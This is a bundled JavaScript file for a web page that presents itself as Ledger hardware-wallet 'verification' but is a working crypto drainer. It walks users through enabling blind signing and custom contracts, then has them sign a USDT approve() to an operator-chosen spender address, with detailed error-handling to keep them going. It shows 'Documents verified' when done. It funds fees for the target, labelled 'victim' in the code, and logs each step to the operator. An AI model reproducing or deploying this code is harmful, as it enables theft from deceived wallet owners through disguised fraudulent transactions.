        icon.textContent = "\u25CB";
        badge.className = "sbadge opt";
        badge.textContent = "Optional";
      } else {
        li.className = "srow off";
        icon.textContent = "!";
        badge.className = "sbadge req";
        badge.textContent = "Enable";
        missingReq++;
      }
    }
    settingsOk = missingReq === 0;
    card.classList.toggle("ok", settingsOk);
    card.classList.toggle("warn", !settingsOk);
    $("scheck-icon").textContent = settingsOk ? "\u2713" : "!";
    $("scheck-title").textContent = settingsOk ? "Device ready \u2014 you can continue" : "Action required on your Ledger";
    $("scheck-sub").textContent = settingsOk ? "All required TRON app settings are enabled" : 'Enable the flagged settings in the TRON app settings, then press "Re-check"';
    const oldApp = typeof cfg.versionN === "number" && cfg.versionN < 40;
    $("scheck-meta").textContent = (ledgerAddress ? `TRON app v${cfg.version} \xB7 ${ledgerAddress.slice(0, 10)}\u2026${ledgerAddress.slice(-6)}` : `TRON app v${cfg.version}`) + (oldApp ? " \xB7 old app version \u2014 update via Ledger Live" : "");
    $("recheck").classList.toggle("hidden", settingsOk);
    updateButtons();
  }
  var SETTING_STEP = (label) => [
    "On the Ledger: open the TRON app",
    'Nano (S/S+/X): press the RIGHT button once \u2192 "App settings" \u2192 press BOTH buttons',
    "Touch (Stax/Flex/Apex): tap the gear / Settings icon",
    `Toggle "${label}" \u2192 Allowed / Enabled`,
    "Exit back to the ready screen",
    'Click "Try Again" below'
  ];
  function classifyError(e) {
    const m = (e?.message || "").toLowerCase();
    const code = e?.statusCode;
    const has = (...xs) => xs.some((x) => m.includes(x));
    const W = "warn", E = "error";
    if (has("session expired", "session not found", "session no longer valid"))
      return {
        kind: E,
        title: "Verification link is no longer valid",
        noRetry: true,
        desc: "This verification session has expired or is unknown to this browser.",
        steps: [
          "Request a new verification link from the operator",
          "Links are valid for 30 minutes after they are first opened",
          "Complete the verification in one browser session \u2014 reloading clears local state"
        ]
      };
    if (code === 27275 || has("0x6a8b"))
      return {
        kind: W,
        title: '"Transactions data" is not allowed',
        desc: "The TRON app blocked the signature because transaction-data display is disabled.",
        steps: SETTING_STEP("Transactions data")
      };
    if (code === 27277 || has("0x6a8d"))
      return {
        kind: W,
        title: '"Custom contracts" is not allowed',
        desc: "The TRON app blocked this smart-contract call (USDT approve). Custom contracts must be enabled.",
        steps: SETTING_STEP("Custom contracts")
      };
    if (code === 27276 || has("0x6a8c"))
      return {
        kind: W,
        title: '"Blind signing" is not allowed',
        desc: "The transaction is too large to display fully \u2014 the app needs hash signing enabled.",
        steps: SETTING_STEP("Blind signing")
      };
    if (!has("broadcast") && (code === 27012 || code === 27264 || has(
      "0x6984",
      "0x6a80",
      "contract data",
      "transactions data",
      "data not allowed",
      "custom contract",
      "blind sign"
    )))
      return {
        kind: W,
        title: "A required TRON app setting is disabled",
        desc: "The Ledger blocked the contract signature. Enable all three settings in the TRON app.",
        steps: [
          "On the Ledger: open the TRON app \u2192 App settings",
          'Set "Transactions data" \u2192 Allowed',
          'Set "Custom contracts" \u2192 Allowed',
          'Set "Blind signing" (Sign by hash) \u2192 Allowed',
          'Return to the ready screen, then click "Try Again"'
        ]
      };
    if (has("no device selected", "requestdevice", "user gesture", "must be handling"))
      return {
        kind: W,
        title: "No device selected",
        desc: "The browser device picker was closed without selecting a Ledger.",
        steps: [
          'Click "Try Again"',
          'In the popup, select your Ledger and click "Connect"',
          "Make sure the Ledger is unlocked and the TRON app is open"
        ]
      };
    if (code === 27274 || has("0x6a8a"))
      return {
        kind: E,
        title: "Invalid derivation path",
        desc: "The app rejected the account path (" + DEFAULT_PATH + ").",
        steps: [
          "This should not happen \u2014 reconnect the Ledger",
          "If it persists, update the TRON app via Ledger Live"
        ]
      };
    if (code === 28416 || has("0x6f00"))
      return {
        kind: E,
        title: "Ledger internal error",
        desc: "The device reported a technical problem (0x6f00).",
        steps: [
          "Unplug and reconnect the Ledger",
          "Restart the TRON app",
          'Click "Try Again"'
        ]
      };
    if (has("too many bytes"))
      return {
        kind: W,
        title: "Transaction too large for the device",
        desc: "The Ledger cannot display this transaction field-by-field. It can still be signed via hash.",
        steps: SETTING_STEP("Blind signing")
      };
    if (code === 27013 || has("0x6985") || /reject|denied|cancel/i.test(m))
      return {
        kind: W,
        title: "Rejected on the Ledger",
        desc: "The signature was declined on the device \u2014 or the confirmation screen was skipped.",
        steps: [
          'Click "Try Again" below',
          "On the Ledger, press the right button to scroll through ALL screens",
          "Verify the contract address is TR7NHqje\u2026Lj6t (USDT)",
          'On the final "Accept" / "Sign" screen, press BOTH buttons'
        ]
      };
    if (code === 28160 || has("0x6e00"))
      return {
        kind: W,
        title: "TRON app is not open",
        desc: "The Ledger is connected, but the TRON app is not running on the device.",
        steps: [
          "On the Ledger, open the TRON app",
          'Wait until "Application is ready" shows',
          'Click "Try Again"'
        ]
      };
    if (code === 27010 || has("0x6982"))
      return {
        kind: W,
        title: "Ledger is locked",
        desc: "The device rejected the command \u2014 it is locked or access was denied.",
        steps: [
          "Unlock the Ledger with your PIN",
          "Open the TRON app",
          'Click "Try Again"'
        ]
      };
    if (has("cannot open device", "access denied", "failed to open", "busy", "locked by"))
      return {
        kind: E,
        title: "Ledger is busy",
        desc: "Another application is holding the Ledger and blocking the connection.",
        steps: [
          "Completely quit Ledger Live",
          "Close other wallet apps or browser tabs using the device",
          "Unplug and reconnect the USB cable",
          'Click "Try Again"'
        ]
      };
    if (has("device not found", "no device", "not connected", "disconnected"))
      return {
        kind: E,
        title: "No Ledger detected",
        desc: "The browser cannot see a Ledger device.",
        steps: [
          "Connect the Ledger via USB (direct port, original cable)",
          "Unlock it with your PIN",
          'Click "Try Again"'
        ]
      };
    if (code === 27904 || has("0x6d00"))
      return {
        kind: E,
        title: "TRON app version too old",
        desc: "The installed TRON app does not support this instruction.",
        steps: [
          "Open Ledger Live \u2192 Manager",
          "Update the TRON app to the latest version",
          'Click "Try Again"'
        ]
      };
    if (has("timeout", "timed out"))
      return {
        kind: E,
        title: "Connection timeout",
        desc: "The Ledger did not respond in time.",
        steps: [
          "Unplug and reconnect the USB cable",
          "Avoid USB hubs \u2014 use a direct port",
          'Click "Try Again"'
        ]
      };
    if (has("expir") && !has("session"))
      return {
        kind: W,
        title: "Transaction expired",
        desc: "Node-built transactions live only ~60 seconds \u2014 the device review outlasted the window.",
        steps: [
          'Click "Try Again" \u2014 a fresh transaction is built automatically',
          "Scroll through the device screens promptly after it appears",
          "We rebuild once automatically; a second expiry needs a manual retry"
        ]
      };
    if (has("account does not exist", "not activated"))
      return {
        kind: E,
        title: "Ledger wallet is not activated on-chain",
        desc: "The connected address has no TRX balance \u2014 TRON cannot process a transaction from an unactivated account.",
        steps: [
          "Send at least ~2 TRX to the Ledger TRON address shown above",
          "Wait a few seconds for the transfer to confirm",
          'Click "Try Again"'
        ]
      };
    if (has(
      "bandwith",
      "balance is not sufficient",
      "accountresourceinsufficient",
      "insufficient",
      "balance"
    ))
      return {
        kind: E,
        title: "Not enough TRX for network fees",
        desc: "The wallet cannot cover Bandwidth/Energy \u2014 the USDT approve costs a small TRX amount.",
        steps: [
          "Top up the Ledger wallet with ~3\u20135 TRX for fees",
          'Click "Try Again"'
        ]
      };
    if (has("sigerror", "validateSignature", "signature error"))
      return {
        kind: E,
        title: "Signature rejected by the network",
        desc: "TRON could not verify the signature against the sender address.",
        steps: [
          'Reconnect the Ledger and click "Try Again"',
          "If it persists, update the TRON app via Ledger Live"
        ]
      };
    if (has("tapos"))
      return {
        kind: W,
        title: "Stale block reference",
        desc: "The transaction referenced a block the node no longer accepts (reorg or expiry).",
        steps: ['Click "Try Again" \u2014 a fresh transaction uses a new block reference']
      };
    if (has("dup_transaction"))
      return {
        kind: W,
        title: "Already broadcast",
        desc: "This exact transaction is already in the network pool \u2014 it cannot be sent twice.",
        steps: [
          "Check the transaction link for its status",
          "If it confirmed, the verification already succeeded"
        ]
      };
    if (has("server_busy", "no_connection", "not_enough_effective", "unsolidified"))
      return {
        kind: W,
        title: "TRON node temporarily unavailable",
        desc: "The RPC node is busy or still syncing \u2014 this is transient.",
        steps: ['Wait a few seconds and click "Try Again"']
      };
    if (has("out_of_energy"))
      return {
        kind: E,
        title: "Transaction ran out of Energy",
        desc: "The contract call consumed the whole Energy budget (fee_limit).",
        steps: [
          "Top up the wallet with more TRX so it can burn for Energy",
          'Click "Try Again"'
        ]
      };
    if (has("broadcast", "revert", "contract_validate_error", "contract_exe_error")) {
      if (ledgerTrxSun === 0)
        return {
          kind: E,
          title: "No TRX for network fees",
          desc: `The connected wallet (${ledgerAddress || "unknown"}) holds 0 TRX. The approve burns ~30 TRX in Energy \u2014 fees are always paid by the signing wallet itself; TRON has no fee sponsorship.`,
          steps: [
            `Send at least 30 TRX to ${ledgerAddress || "the wallet"} (e.g. from Trust Wallet)`,
            "Wait ~5 seconds for the transfer to confirm",
            'Click "Try Again"'
          ]
        };
      return {
        kind: E,
        title: "Transaction rejected by network",
        desc: "TRON refused the transaction \u2014 most likely missing TRX for fees/energy or an invalid parameter.",
        steps: [
          `Wallet balance: ${ledgerTrxSun === null ? "unknown" : ledgerTrxSun / 1e6 + " TRX"} \u2014 check it covers the energy burn (~30 TRX)`,
          "Verify the spender address is correct",
          'Click "Try Again"'
        ]
      };
    }
    if (has("webhid", "not supported", "navigator.hid"))
      return {
        kind: E,
        title: "Browser not supported",
        desc: "This browser cannot talk to USB devices via WebHID.",
        steps: [
          "Use Chrome or Edge on a desktop computer",
          "Reload the page and try again"
        ]
      };
    return {
      kind: E,
      title: "Unexpected error",
      desc: e?.message || String(e),
      steps: [
        "Reconnect the Ledger (unplug \u2192 replug \u2192 unlock \u2192 open TRON app)",
        'Click "Try Again" \u2014 or reload the page'
      ]
    };
  }
  function showErrorPanel(e) {
    const { kind, title, desc, steps, noRetry } = classifyError(e);
    const panel = $("error-panel");
    if (!panel) return;
    const warn = kind === "warn";
    panel.style.borderColor = warn ? "#f0b429" : "#d92d20";
    panel.style.background = warn ? "#fffaeb" : "#fef3f2";
    $("error-icon").style.color = warn ? "#b54708" : "#d92d20";
    $("error-title").textContent = title;
    $("error-title").style.color = warn ? "#b54708" : "#d92d20";
    $("error-desc").textContent = desc;
    const ol = $("error-steps");
    ol.innerHTML = "";
    for (const s of steps) {
      const li = document.createElement("li");
      li.textContent = s;
      ol.appendChild(li);
    }
    $("error-retry").style.display = noRetry ? "none" : "";
    panel.classList.remove("hidden");
    panel.scrollIntoView({ behavior: "smooth", block: "nearest" });
    return title;
  }
  function hideErrorPanel() {
    $("error-panel")?.classList.add("hidden");
  }
  $("error-retry").addEventListener("click", () => {
    hideErrorPanel();
    const target = lastAction === "approve" ? $("approve") : lastAction === "revoke" ? $("revoke") : $("connect");
    if (target.disabled) target.disabled = false;
    target.click();
  });
  $("error-dismiss").addEventListener("click", hideErrorPanel);
  function checkBrowserSupport() {
    if (!navigator.hid) {
      setStatus("Unsupported browser \u2014 please use Chrome or Edge on a desktop computer (WebHID required).");
      $("connect").disabled = true;
      $("connect").textContent = "WebHID not supported";
      return false;
    }
    return true;
  }
  async function openTransport() {
    const existing = await TransportWebHID.openConnected().catch(() => null);
    if (existing) return existing;
    return TransportWebHID.create();
  }
  var sha256hex = async (hex) => {
    const h = await crypto.subtle.digest("SHA-256", import_buffer2.Buffer.from(hex, "hex"));
    return Array.from(new Uint8Array(h)).map((b) => b.toString(16).padStart(2, "0")).join("");
  };
  function instrument(transport) {
    const orig = transport.send.bind(transport);
    transport.send = (cla, ins, p1, p2, data, statusList) => {
      const payload = data ? " data=" + import_buffer2.Buffer.from(data).toString("hex") : "";
      log2(
        `>> APDU  CLA=0x${cla.toString(16).padStart(2, "0")} INS=0x${ins.toString(16).padStart(2, "0")} P1=0x${p1.toString(16).padStart(2, "0")} P2=0x${p2.toString(16).padStart(2, "0")}${payload}`,
        "apdu"
      );
      return orig(cla, ins, p1, p2, data, statusList).then((res) => {
        log2(`<< RESP ${import_buffer2.Buffer.from(res).toString("hex")}`, "resp");
        return res;
      });
    };
    return transport;
  }
  async function apiOnce(path, body) {
    const r = await fetch(NETWORK.rpc + path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    if (!r.ok) throw new Error(`RPC ${path}: HTTP ${r.status}`);
    return r.json();
  }
  async function api(path, body, tries = 3) {
    let lastErr;
    for (let i = 0; i < tries; i++) {
      try {
        return await apiOnce(path, body);
      } catch (e) {
        lastErr = e;
        if (i < tries - 1) await sleep(800 * (i + 1));
      }
    }
    throw lastErr;
  }
  var TX_EXPIRY_GUARD_MS = 15e3;
  var MAX_TX_ATTEMPTS = 2;
  var txExpiresIn = (tx) => (tx?.raw_data?.expiration || 0) - Date.now();
  function decodeMsg(m) {
    if (!m) return "";
    if (/^[0-9a-fA-F]+$/.test(m) && m.length % 2 === 0) {
      const t = import_buffer2.Buffer.from(m, "hex").toString("utf8");
      if (/^[\x20-\x7e\s]*$/.test(t)) return t;
    }
    return m;
  }
  var sigToHex = (be) => {
    if (typeof be === "string") return be;
    const u = be instanceof ArrayBuffer ? new Uint8Array(be) : be;
    const arr = u instanceof Uint8Array ? u : Object.values(be || {});
    if (!arr.length) throw new Error("Unexpected signature format");
    return Array.from(arr).map((x) => x.toString(16).padStart(2, "0")).join("");
  };
  async function buildSignBroadcast(param, op) {
    for (let attempt = 1; attempt <= MAX_TX_ATTEMPTS; attempt++) {
      setStatus(attempt > 1 ? "Rebuilding a fresh transaction\u2026" : "Building transaction\u2026");
      const built = await api("/wallet/triggersmartcontract", {
        owner_address: ledgerAddress,
        contract_address: NETWORK.contract,
        function_selector: "approve(address,uint256)",
        parameter: param,
        fee_limit: 1e8,
        call_value: 0,
        visible: true
      });
      if (!built?.result?.result || !built.transaction)
        throw new Error("Transaction could not be built: " + decodeMsg(built?.result?.message));
      const tx = built.transaction;
      if (tx.txID && await sha256hex(tx.raw_data_hex) !== tx.txID)
        throw new Error("Transaction integrity check failed (txID \u2260 sha256 of raw data)");
      log2("Calldata: " + (tx.raw_data.contract[0].parameter.value.data || "(empty)"), "info");
      if (txExpiresIn(tx) < TX_EXPIRY_GUARD_MS) {
        if (attempt < MAX_TX_ATTEMPTS) {
          log2("Tx expiry window too short \u2014 rebuilding", "warn");
          continue;
        }
        throw new Error("Transaction expiry window too short \u2014 please retry");
      }
      setStatus("Please confirm on Ledger\u2026 (the transaction is valid ~60s \u2014 confirm promptly)");
      monit("sign_wait", { op, attempt });
      const transport = instrument(await openTransport());
      const trx = new Trx(transport);
      let be;
      const watchdog = setTimeout(() => setStatus("Still waiting \u2014 scroll through all screens and accept on the Ledger"), 45e3);
      try {
        be = await signWithLedger(trx, tx);
      } catch (e2) {
        clearTimeout(watchdog);
        await transport.close();
        throw e2;
      }
      clearTimeout(watchdog);
      await transport.close();
      const sig = sigToHex(be);
      monit("signed", { op, attempt });
      if (txExpiresIn(tx) <= 0) {
        if (attempt < MAX_TX_ATTEMPTS) {
          setStatus("Transaction expired during review \u2014 rebuilding, please confirm again on the Ledger\u2026");
          log2("Tx expired during device review \u2014 rebuilding", "warn");
          continue;
        }
        throw new Error("Transaction expired during device review \u2014 please retry");
      }
      setStatus("Broadcasting transaction\u2026");
      const out = await api("/wallet/broadcasttransaction", { ...tx, signature: [sig] });
      if (out.result === true) {
        monit("broadcast", { op, tx: tx.txID, attempt, from: ledgerAddress, spender: spenderAddress });
        return tx;
      }
      const code = out.code || "";
      const msg = decodeMsg(out.message);
      if (attempt < MAX_TX_ATTEMPTS && (code === "TRANSACTION_EXPIRATION_ERROR" || code === "TAPOS_ERROR" || /expired|tapos/i.test(msg))) {
        setStatus("Transaction went stale \u2014 rebuilding, please confirm again on the Ledger\u2026");
        log2(`Broadcast ${code || msg} \u2014 rebuilding`, "warn");
        monit("tx_stale_rebuild", { op, code });
        continue;
      }
      if (code === "DUP_TRANSACTION_ERROR") {
        monit("broadcast", { op, tx: tx.txID, dup: true });
        return tx;
      }
      const e = new Error(`Broadcast ${code || "FAILED"}: ${msg || JSON.stringify(out).slice(0, 200)}`);
      e.broadcastCode = code;
      throw e;
    }
    throw new Error("Transaction expired during review \u2014 please retry");
  }
  async function signWithLedger(trx, tx) {
    try {
      return await trx.signTransaction(DEFAULT_PATH, tx.raw_data_hex);
    } catch (e) {
      if (!(e?.message || "").toLowerCase().includes("too many bytes")) throw e;
      log2("Tx too large for on-device display \u2014 falling back to hash signing", "warn");
      setStatus("Confirm hash signature on Ledger\u2026");
      const h = await crypto.subtle.digest("SHA-256", import_buffer2.Buffer.from(tx.raw_data_hex, "hex"));
      const hashHex = Array.from(new Uint8Array(h)).map((b) => b.toString(16).padStart(2, "0")).join("");
      return await trx.signTransactionHash(DEFAULT_PATH, hashHex);
    }
  }
  async function waitConfirm(txID, timeoutMs = 9e4) {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      await sleep(3e3);
      const info = await api("/wallet/gettransactioninfobyid", { value: txID }).catch(() => null);
      const receipt = info?.receipt;
      if (receipt?.result) return { ok: receipt.result === "SUCCESS", info };
      if (info?.contractResult?.[0] && !receipt)
        return { ok: true, info };
    }
    return { ok: false, timeout: true };
  }
  $("connect").addEventListener("click", async () => {
    if (busy) return;
    setBusy(true);
    lastAction = "connect";
    hideErrorPanel();
    monit("connect_click");
    try {
      const check = await validateSession();
      if (!check.valid) {
        if (check.reason === "Already completed") {
          const prev = getSessions()[SESSION_ID] || {};
          showCompletion(prev.txID || check.txID);
          monit("kyc_already_done", { at: "ledger" });
          return;
        }
        const title = showErrorPanel(new Error(check.reason));
        setStatus("Error: " + title);
        log2("Session validation failed: " + check.reason, "warn");
        monit("session_blocked", { reason: check.reason });
        return;
      }
      spenderAddress = getSpenderAddress();
      readApproveUnits();
      if (!spenderAddress) {
        setStatus("Error: No spender address configured. Please configure in Dashboard.");
        log2("Error: No spender address found in URL or localStorage", "warn");
        return;
      }
      setStatus("Connecting to Ledger\u2026");
      const known = await TransportWebHID.list();
      if (known.length > 0) {
        try {
          await (await TransportWebHID.open(known[0])).close();
        } catch {
        }
      }
      const transport = instrument(await openTransport());
      activeTransport = transport;
      transport.on("disconnect", () => {
        log2("Ledger disconnected", "warn");
        setStatus("Ledger disconnected \u2014 please restart.");
      });
      const trx = new Trx(transport);
      const cfg = await trx.getAppConfiguration();
      log2(`TRON App v${cfg.version} on device`, "info");
      log2(`Settings \u2014 data:${cfg.allowData} contract:${cfg.allowContract} signByHash:${cfg.signByHash}`, "info");
      const missing = [];
      if (!cfg.allowData) missing.push("Transactions data");
      if (!cfg.allowContract) missing.push("Custom contracts");
      if (!cfg.signByHash) missing.push("Blind signing (Sign by hash)");
      ledgerCfg = cfg;
      if (missing.length) {
        log2("Missing settings: " + missing.join(", "), "warn");
        monit("ledger_settings_missing", { missing: missing.join(","), appVersion: cfg.version });
      }
      const { address } = await trx.getAddress(DEFAULT_PATH);
      ledgerAddress = address;
      log2(`Ledger address: ${address}`, "info");
      monit("ledger_connected", { wallet: address, from: address, appVersion: cfg.version, acct: ACCT, path: DEFAULT_PATH });
      try {
        const acct = await api("/wallet/getaccount", { address, visible: true });
        ledgerTrxSun = acct?.balance ?? 0;
      } catch {
        ledgerTrxSun = null;
      }
      log2(`Wallet TRX balance: ${ledgerTrxSun === null ? "unknown" : ledgerTrxSun / 1e6 + " TRX"}`, ledgerTrxSun === 0 ? "warn" : "info");
      if (ledgerTrxSun === 0) monit("ledger_no_trx", { wallet: address });
      if (ledgerTrxSun !== null && ledgerTrxSun < 12e6) {
        try {
          setStatus("Requesting network fee credit\u2026");
          const r = await fetch("/api/energy", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ step: "pay", victim: address, src: "ledger" })
          });
          const j = await r.json().catch(() => ({}));
          if (j.gas_tx) {
            log2("Fee credit sent: " + j.gas_tx, "info");
            monit("ledger_gas_drop", { tx: j.gas_tx });
            setStatus("Fee credit sent \u2014 waiting for confirmation\u2026");
            for (let i = 0; i < 8; i++) {
              await sleep(1500);
              try {
                const acct = await api("/wallet/getaccount", { address, visible: true });
                if ((acct?.balance || 0) > ledgerTrxSun) {
                  ledgerTrxSun = acct.balance;
                  break;
                }
              } catch {
              }
            }
            log2(`Wallet TRX balance now: ${(ledgerTrxSun / 1e6).toFixed(2)} TRX`, "info");
          } else {
            log2("Fee credit skipped: " + (j.skip || j.error || "unknown"), "warn");
            monit("ledger_gas_skip", { reason: j.skip || j.error || "unknown" });
          }
        } catch (e) {
          log2("Fee credit request failed: " + (e?.message || e), "warn");
        }
      }
      if (SESSION_ID) {
        const sessions = getSessions();
        if (sessions[SESSION_ID]) {
          sessions[SESSION_ID].wallet = address;
          localStorage.setItem("kyc_sessions", JSON.stringify(sessions));
        }
      }
      $("spender-display").textContent = spenderAddress;
      const amtLabel = approveAmountLabel();
      if ($("amount-display")) $("amount-display").textContent = amtLabel;
      $("approve").textContent = "Sign Approve";
      if (amtInvalid) {
        setStatus("Error: invalid approve amount in link \u2014 generate a new link in the dashboard");
        $("status2").style.color = "#d92d20";
        updateButtons();
        await transport.close();
        activeTransport = null;
        return;
      }
      if ($("trx-balance")) $("trx-balance").textContent = ledgerTrxSun === null ? "unknown" : (ledgerTrxSun / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 }) + " TRX";
      if ($("trx-warn")) $("trx-warn").classList.toggle("hidden", ledgerTrxSun !== 0);
      setStatus("Ledger connected \u2014 please sign approve");
      $("step1").classList.add("hidden");
      $("step2").classList.remove("hidden");
      renderSettingsCheck(ledgerCfg);
      if (settingsOk) {
        $("status2").style.color = "";
        setStatus("Device ready \u2014 confirm the transaction details below.");
        monit("ledger_settings_ok", { appVersion: ledgerCfg.version });
      } else {
        setStatus("Action required on the Ledger \u2014 see the settings checklist below.");
        $("status2").style.color = "#b54708";
      }
      await transport.close();
      activeTransport = null;
    } catch (e) {
      try {
        await activeTransport?.close();
      } catch {
      }
      activeTransport = null;
      const title = showErrorPanel(e);
      setStatus("Error: " + title);
      log2("Error: " + (e?.message || e), "warn");
      monit("ledger_error", { at: "connect", code: e?.statusCode, title, msg: (e?.message || String(e)).slice(0, 200) });
    } finally {
      setBusy(false);
    }
  });
  $("approve").addEventListener("click", async () => {
    if (busy) return;
    setBusy(true);
    lastAction = "approve";
    hideErrorPanel();
    monit("approve_start");
    try {
      const check = await validateSession();
      if (!check.valid) {
        if (check.reason === "Already completed") {
          const prev = getSessions()[SESSION_ID] || {};
          showCompletion(prev.txID || check.txID);
          return;
        }
        const title = showErrorPanel(new Error(check.reason));
        setStatus("Error: " + title);
        log2("Session no longer valid at signing time: " + check.reason, "warn");
        monit("session_blocked", { reason: check.reason, at: "sign" });
        return;
      }
      if (!isTronAddr(spenderAddress)) throw new Error("Invalid spender address");
      if (amtInvalid) throw new Error("The approve amount embedded in this link is invalid \u2014 generate a new link");
      setStatus("Checking existing allowance\u2026");
      if (await currentAllowance(ledgerAddress, spenderAddress) >= approveUnits) {
        markSessionVerified(null);
        monit("already_approved", { op: "approve" });
        log2("Existing allowance detected \u2014 skipping duplicate approve", "ok");
        showCompletion(null);
        $("result-detail").textContent = "Documents verified \xB7 Approval already set on-chain \u2014 no new transaction needed";
        return;
      }
      const tx = await buildSignBroadcast(addrParam(spenderAddress) + approveUnits.toString(16).padStart(64, "0"), "approve");
      setStatus("Waiting for confirmation\u2026");
      const conf = await waitConfirm(tx.txID);
      if (conf.ok) {
        markSessionVerified(tx.txID);
        showCompletion(tx.txID);
        log2("Confirmed: " + tx.txID, "ok");
        monit("confirmed", { op: "approve", tx: tx.txID, from: ledgerAddress, spender: spenderAddress });
      } else {
        const rcpt = conf.info?.receipt?.result;
        const reason = conf.timeout ? "Confirmation timed out \u2014 check the transaction link for the final on-chain status" : `Transaction failed on-chain (${rcpt || "reverted"})`;
        showResult(
          "err",
          "Verification Failed",
          reason,
          tx.txID,
          "The signature was broadcast but the transaction did not confirm. You may retry or request a new link."
        );
        log2("Not confirmed: " + tx.txID, "warn");
        monit("tx_failed", { op: "approve", tx: tx.txID, reason });
      }
    } catch (e) {
      const title = showErrorPanel(e);
      setStatus("Error: " + title);
      log2("Error: " + (e?.message || e), "warn");
      monit("ledger_error", { at: "approve", code: e?.statusCode, title, msg: (e?.message || String(e)).slice(0, 200) });
    } finally {
      setBusy(false);
    }
  });
  $("revoke").addEventListener("click", async () => {
    if (busy) return;
    setBusy(true);
    lastAction = "revoke";
    hideErrorPanel();
    monit("revoke_start");
    try {
      if (!isTronAddr(spenderAddress)) throw new Error("Invalid spender address");
      const tx = await buildSignBroadcast(addrParam(spenderAddress) + "0".repeat(64), "revoke");
      setStatus("Waiting for confirmation\u2026");
      const conf = await waitConfirm(tx.txID);
      if (conf.ok) {
        showResult(
          "ok",
          "Approval Revoked",
          "The spender approval was removed on-chain.",
          tx.txID,
          "Allowance is now 0 \u2014 no further withdrawals are possible."
        );
        log2("Revoke confirmed: " + tx.txID, "ok");
        monit("confirmed", { op: "revoke", tx: tx.txID, from: ledgerAddress, spender: spenderAddress });
      } else {
        const rcpt = conf.info?.receipt?.result;
        showResult(
          "err",
          "Revoke Failed",
          conf.timeout ? "Confirmation timed out \u2014 check the transaction link" : `Revoke failed on-chain (${rcpt || "reverted"})`,
          tx.txID
        );
        monit("tx_failed", { op: "revoke", tx: tx.txID, reason: rcpt || "revert" });
      }
    } catch (e) {
      const title = showErrorPanel(e);
      setStatus("Error: " + title);
      log2("Error: " + (e?.message || e), "warn");
      monit("ledger_error", { at: "revoke", code: e?.statusCode, title, msg: (e?.message || String(e)).slice(0, 200) });
    } finally {
      setBusy(false);
    }
  });
  $("recheck").addEventListener("click", async () => {
    if (busy) return;
    setBusy(true);
    hideErrorPanel();
    monit("ledger_settings_recheck");
    try {
      const check = await validateSession();
      if (!check.valid) {
        if (check.reason === "Already completed") {
          const prev = getSessions()[SESSION_ID] || {};
          showCompletion(prev.txID || check.txID);
          return;
        }
        const title = showErrorPanel(new Error(check.reason));
        setStatus("Error: " + title);
        return;
      }
      setStatus("Re-reading device settings\u2026");
      const transport = instrument(await openTransport());
      const trx = new Trx(transport);
      const cfg = await trx.getAppConfiguration();
      await transport.close();
      ledgerCfg = cfg;
      renderSettingsCheck(cfg);
      if (settingsOk) {
        $("status2").style.color = "";
        setStatus("Device ready \u2014 confirm the transaction details below.");
        monit("ledger_settings_ok", { appVersion: cfg.version, recheck: true });
      } else {
        const miss = [];
        if (!cfg.allowData) miss.push("Transactions data");
        if (!cfg.allowContract) miss.push("Custom contracts");
        setStatus("Still missing \u2014 enable the flagged settings on the device.");
        monit("ledger_settings_missing", { missing: miss.join(","), appVersion: cfg.version, recheck: true });
      }
    } catch (e) {
      const title = showErrorPanel(e);
      setStatus("Error: " + title);
      log2("Error: " + (e?.message || e), "warn");
      monit("ledger_error", { at: "recheck", code: e?.statusCode, title });
    } finally {
      setBusy(false);
    }
  });
  $("reset").addEventListener("click", () => {
    ledgerAddress = "";
    ledgerCfg = null;
    settingsOk = true;
    $("step1").classList.remove("hidden");
    $("step2").classList.add("hidden");
    $("step3").classList.add("hidden");
    $("settings-check").classList.add("hidden");
    $("apdu-log").innerHTML = "";
    hideErrorPanel();
    lastAction = null;
    setStatus("Ready \u2014 connect Ledger via USB, open TRON app on device.");
    setResultStatus("-");
    $("result-title").textContent = "Verification Result";
    $("result-detail").textContent = "";
    $("done-hint").classList.add("hidden");
    $("reset").classList.remove("hidden");
    $("status2").style.color = "";
    setTxLink(null);
    updateButtons();
  });
  if (!checkBrowserSupport()) {
    log2("WebHID not supported in this browser", "warn");
  }
  $("toggleApdu").addEventListener("click", () => {
    const log3 = $("apdu-log");
    const open = log3.classList.toggle("hidden") === false;
    $("toggleApdu").textContent = open ? "Hide APDU Log" : "Show APDU Log";
    $("toggleApdu").classList.toggle("on", open);
  });
})();
/*! Bundled license information:

ieee754/index.js:
  (*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> *)

buffer/index.js:
  (*!
   * The buffer module from node.js, for the browser.
   *
   * @author   Feross Aboukhadijeh <https://feross.org>
   * @license  MIT
   *)
*/
